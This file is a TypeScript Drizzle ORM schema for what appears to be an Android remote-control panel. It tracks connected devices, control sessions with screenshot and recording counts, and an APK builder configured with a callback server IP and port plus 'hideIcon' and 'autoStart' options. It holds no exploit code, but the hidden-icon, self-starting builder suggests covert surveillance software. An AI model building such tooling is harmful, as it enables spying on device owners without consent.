import { sql } from "drizzle-orm";
import { pgTable, text, varchar, integer, boolean, timestamp, jsonb } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const devices = pgTable("devices", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  name: text("name").notNull(),
  androidVersion: text("android_version").notNull(),
  deviceModel: text("device_model").notNull(),
  packageName: text("package_name").notNull(),
  batteryLevel: integer("battery_level").default(0),
  isConnected: boolean("is_connected").default(false),
  lastSeen: timestamp("last_seen").defaultNow(),
  tcpAddress: text("tcp_address"),
  tcpPort: integer("tcp_port"),
  screenWidth: integer("screen_width").default(1080),
  screenHeight: integer("screen_height").default(1920),
  metadata: jsonb("metadata").default({}),
  createdAt: timestamp("created_at").defaultNow(),
});

export const sessions = pgTable("sessions", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  deviceId: varchar("device_id").notNull().references(() => devices.id),
  isActive: boolean("is_active").default(true),
  startedAt: timestamp("started_at").defaultNow(),
  endedAt: timestamp("ended_at"),
  controlCommands: integer("control_commands").default(0),
  screenshotsTaken: integer("screenshots_taken").default(0),
  recordingDuration: integer("recording_duration").default(0),
});

export const apkConfigurations = pgTable("apk_configurations", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  appName: text("app_name").notNull(),
  packageName: text("package_name").notNull(),
  serverIP: text("server_ip").notNull(),
  serverPort: integer("server_port").notNull(),
  autoStart: boolean("auto_start").default(true),
  hideIcon: boolean("hide_icon").default(false),
  enableLogging: boolean("enable_logging").default(true),
  buildStatus: text("build_status").default("idle"), // idle, building, completed, failed
  apkPath: text("apk_path"),
  fileSize: integer("file_size"),
  createdAt: timestamp("created_at").defaultNow(),
});

export const activityLogs = pgTable("activity_logs", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  deviceId: varchar("device_id").references(() => devices.id),
  sessionId: varchar("session_id").references(() => sessions.id),
  type: text("type").notNull(), // connection, command, screenshot, error, etc.
  message: text("message").notNull(),
  metadata: jsonb("metadata").default({}),
  timestamp: timestamp("timestamp").defaultNow(),
});

// Insert schemas
export const insertDeviceSchema = createInsertSchema(devices).omit({
  id: true,
  createdAt: true,
  lastSeen: true,
});

export const insertSessionSchema = createInsertSchema(sessions).omit({
  id: true,
  startedAt: true,
});

export const insertApkConfigurationSchema = createInsertSchema(apkConfigurations).omit({
  id: true,
  createdAt: true,
  buildStatus: true,
  apkPath: true,
  fileSize: true,
});

export const insertActivityLogSchema = createInsertSchema(activityLogs).omit({
  id: true,
  timestamp: true,
});

// Types
export type Device = typeof devices.$inferSelect;
export type InsertDevice = z.infer<typeof insertDeviceSchema>;
export type Session = typeof sessions.$inferSelect;
export type InsertSession = z.infer<typeof insertSessionSchema>;
export type ApkConfiguration = typeof apkConfigurations.$inferSelect;
export type InsertApkConfiguration = z.infer<typeof insertApkConfigurationSchema>;
export type ActivityLog = typeof activityLogs.$inferSelect;
export type InsertActivityLog = z.infer<typeof insertActivityLogSchema>;
